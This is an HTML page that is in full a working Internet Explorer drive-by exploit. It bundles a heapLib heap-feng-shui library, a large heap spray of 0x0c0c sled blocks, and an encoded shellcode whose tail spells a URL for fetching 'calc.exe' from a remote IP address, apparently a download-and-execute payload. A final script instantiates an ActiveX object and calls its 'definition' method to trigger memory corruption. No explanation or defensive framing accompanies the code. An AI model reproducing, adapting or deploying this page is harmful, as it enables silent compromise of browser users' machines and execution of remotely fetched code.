<html>
<head>
<script>
function heapLib() {
}


heapLib.ie = function(maxAlloc, heapBase) {

	this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
	this.heapBase = (heapBase ? heapBase : 0x150000);

	// Allocate a padding string that uses maxAlloc bytes
	this.paddingStr = "AAAA";

	while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
this.paddingStr += this.paddingStr;
	}
	
	// Create an array for storing references to allocated memory
	this.mem = new Array();

	// Call flushOleaut32() once to allocate the maximum size blocks
	this.flushOleaut32();
}


heapLib.ie.prototype.debug = function(msg) {
	void(Math.atan2(0xbabe, msg));
}


heapLib.ie.prototype.debugHeap = function(enable) {

	if (enable == true)
void(Math.atan(0xbabe));
	else
void(Math.asin(0xbabe));
}


heapLib.ie.prototype.debugBreak = function(msg) {
	void(Math.acos(0xbabe));
}

heapLib.ie.prototype.padding = function(len) {
	if (len > this.paddingStr.length)
throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

	return this.paddingStr.substr(0, len);
}


heapLib.ie.prototype.round = function(num, round) {
	if (round == 0)
throw "Round argument cannot be 0";

	return parseInt((num + (round-1)) / round) * round;
}


heapLib.ie.prototype.hex = function(num, width)
{
	var digits = "0123456789ABCDEF";

	var hex = digits.substr(num & 0xF, 1);

	while (num > 0xF) {
num = num >>> 4;
hex = digits.substr(num & 0xF, 1) + hex;
	}

	var width = (width ? width : 0);

	while (hex.length < width)
hex = "0" + hex;

	return hex;
}

heapLib.ie.prototype.addr = function(addr) {
	return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}


heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

	var size;

	// Calculate the allocation size
	if (typeof arg == "string" || arg instanceof String)
size = 4 + arg.length*2 + 2;    // len + string data + null terminator
	else
size = arg;

	// Make sure that the size is valid
	if ((size & 0xf) != 0)
throw "Allocation size " + size + " must be a multiple of 16";

	// Create an array for this tag if doesn't already exist
	if (this.mem[tag] === undefined)
this.mem[tag] = new Array();

	if (typeof arg == "string" || arg instanceof String) {
// Allocate a new block with strdup of the string argument
this.mem[tag].push(arg.substr(0, arg.length));
	}
	else {
// Allocate the block
this.mem[tag].push(this.padding((arg-6)/2));
	}
}


heapLib.ie.prototype.freeOleaut32 = function(tag) {

	delete this.mem[tag];
	
	// Run the garbage collector
	CollectGarbage();
}


heapLib.ie.prototype.flushOleaut32 = function() {

	this.debug("Flushing the OLEAUT32 cache");

	// Free the maximum size blocks and push out all smaller blocks

	this.freeOleaut32("oleaut32");
	
	// Allocate the maximum sized blocks again, emptying the cache

	for (var i = 0; i < 6; i++) {
this.allocOleaut32(32, "oleaut32");
this.allocOleaut32(64, "oleaut32");
this.allocOleaut32(256, "oleaut32");
this.allocOleaut32(32768, "oleaut32");
	}
}


heapLib.ie.prototype.alloc = function(arg, tag) {

	var size;

	// Calculate the allocation size
	if (typeof arg == "string" || arg instanceof String)
size = 4 + arg.length*2 + 2;    // len + string data + null terminator
	else
size = arg;

	// Make sure that the size is valid
	if (size == 32 || size == 64 || size == 256 || size == 32768)
throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

	// Allocate the block with the OLEAUT32 allocator
	this.allocOleaut32(arg, tag);
}


heapLib.ie.prototype.free = function(tag) {

	// Free the blocks with the OLEAUT32 free function
	this.freeOleaut32(tag);

	// Flush the OLEAUT32 cache
	this.flushOleaut32();
}

heapLib.ie.prototype.gc = function() {

	this.debug("Running the garbage collector");
	CollectGarbage();

	this.flushOleaut32();
}


heapLib.ie.prototype.freeList = function(arg, count) {

	var count = (count ? count : 1);

	for (var i = 0; i < count; i++) {
this.alloc(arg);
this.alloc(arg, "freeList");
	}
	this.alloc(arg);

	this.free("freeList");
}


heapLib.ie.prototype.lookaside = function(arg, count) {

	var size;

	// Calculate the allocation size
	if (typeof arg == "string" || arg instanceof String)
size = 4 + arg.length*2 + 2;    // len + string data + null terminator
	else
size = arg;

	// Make sure that the size is valid
	if ((size & 0xf) != 0)
throw "Allocation size " + size + " must be a multiple of 16";

	if (size+8 >= 1024)
throw("Maximum lookaside block size is 1008 bytes");

	var count = (count ? count : 1);

	for (var i = 0; i < count; i++)
this.alloc(arg, "lookaside");

	this.free("lookaside");
}


heapLib.ie.prototype.lookasideAddr = function(arg)
{
	var size;

	// Calculate the allocation size
	if (typeof arg == "string" || arg instanceof String)
size = 4 + arg.length*2 + 2;    // len + string data + null terminator
	else
size = arg;

	// Make sure that the size is valid
	if ((size & 0xf) != 0)
throw "Allocation size " + size + " must be a multiple of 16";

	if (size+8 >= 1024)
throw("Maximum lookaside block size is 1008 bytes");

	// The lookahead array starts at heapBase + 0x688. It contains a 48 byte
	// structure for each block size + header size in 8 byte increments.

	return this.heapBase + 0x688 + ((size+8)/8)*48;
}


heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

	var size = (size ? size : 1008);

	if ((size & 0xf) != 0)
throw "Vtable size " + size + " must be a multiple of 16";

	if (shellcode.length*2 > size-138)
throw("Maximum shellcode length is " + (size-138) + " bytes");

	var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

	for (var i = 0; i < 124/4; i++)
vtable += this.addr(jmpecx);

	
	vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
	  shellcode + heap.padding((size-138)/2 - shellcode.length);

	return vtable;
}

var heap_obj = new heapLib.ie(0x20000);
var code = unescape("%u10eb%u4a5a%uc933%ub966%u013c%u3480%u990a%ufae2%u05eb%uebe8%uffff%u70ff%u994c%u9999%ufdc3%ua938%u9999%u1299%u95d9%ue912%u3485%ud912%u1291%u1241%ua5ea%ued12%ue187%u6a9a%ue712%u9ab9%u1262%u8dd7%u74aa%ucecf%u12c8%u9aa6%u1262%uf36b%uc097%u3f6a%u91ed%uc6c0%u5e1a%udc9d%u707b%uc6c0%u12c7%u1254%ubddf%u5a9a%u7848%u589a%u50aa%u12ff%u1291%u85df%u5a9a%u7858%u9a9b%u1258%u9a99%u125a%u1263%u1a6e%u975f%u4912%u9df3%u71c0%u99c9%u9999%u5f1a%ucb94%u66cf%u65ce%u12c3%uf341%uc098%ua471%u9999%u1a99%u8a5f%udfcf%ua719%uec19%u1963%u19af%u1ac7%ub975%u4512%ub9f3%u66ca%u75ce%u9d5e%uc59a%ub7f8%u5efc%u9add%ue19d%u99fc%uaa99%uc959%ucac9%uc9cf%uce66%u1265%uc945%u66ca%u69ce%u66c9%u6dce%u59aa%u1c35%uec59%uc860%ucfcb%u66ca%uc34b%u32c0%u777b%u59aa%u715a%u66bf%u6666%ufcde%uc9ed%uf6eb%ud8fa%ufdfd%ufceb%ueaea%ude99%uedfc%ue0ca%uedea%uf4fc%uf0dd%ufceb%uedfa%uebf6%ud8e0%uce99%uf7f0%ue1dc%ufafc%udc99%uf0e1%ucded%uebf1%uf8fc%u99fd%uf6d5%ufdf8%uf0d5%uebfb%uebf8%ud8e0%uec99%uf5eb%uf6f4%u99f7%ucbcc%uddd5%ueef6%uf5f7%uf8f6%ucdfd%udff6%uf5f0%ud8fc%u6899%u7474%u3a70%u2f2f%u3032%u2e32%u3833%u362e%u2e34%u3031%u7e2f%u6f66%u6572%u7473%u7265%u632f%u6c61%u2e63%u7865%u8065");
var nops = unescape("%u0c0c%u0c0c");

while (nops.length < 0x80000) nops += nops;

var offset = nops.substring(0, 0x100);
var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

while (shellcode.length < 0x40000) shellcode += shellcode;
var block = shellcode.substring(0, (0x80000-6)/2);


heap_obj.gc();
for (var z=1; z < 0x230; z++) {
	heap_obj.alloc(block);
}


</script>
</head>
<body>
<object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="zyPj"></object>
<script>
var obj = document.getElementById('zyPj').object;
var src = unescape("%u0c08%u0c0c");
while (src.length < 0x1002) src += src;
src = "\\\\xxx" + src;
src = src.substr(0, 0x1000 - 10);
var pic = document.createElement("img");
pic.src = src;
pic.nameProp;
obj.definition(676);

</script>
</body>
</html>
